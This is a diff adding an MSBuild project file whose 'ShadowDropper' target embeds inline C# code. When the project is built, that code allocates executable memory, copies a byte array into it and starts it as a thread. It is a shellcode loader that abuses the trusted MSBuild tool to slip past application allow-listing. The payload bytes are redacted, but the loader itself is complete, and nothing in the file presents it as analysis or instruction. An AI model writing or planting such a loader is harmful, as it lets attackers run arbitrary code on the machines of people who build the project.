@@ -1,0 +1,43 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="ShadowDropper">
+    <ClassExample />
+  </Target>
+  <UsingTask
+    TaskName="ClassExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Reference Include="System.Management.Automation" />
+      <Using Namespace="System"/>
+      <Using Namespace="System.Reflection"/>
+      <Using Namespace="System.Diagnostics"/>
+      <Using Namespace="System.Runtime.InteropServices"/>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+        using System;
+        using System.Runtime.InteropServices;
+
+        public class ClassExample : Microsoft.Build.Utilities.Task
+        {
+            [DllImport("kernel32")]
+            private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+            [DllImport("kernel32")]
+            private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+            [DllImport("msvcrt")]
+            private static extern IntPtr memcpy(IntPtr dest, byte[] src, int count);
+
+            public override bool Execute()
+            {
+                // Payload binary path removed for sanitization
+                byte[] buf = new byte[] { /* REDACTED_PAYLOAD_BYTES */ };
+                IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
+                memcpy(addr, buf, buf.Length);
+                CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+                return true;
+            }
+        }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
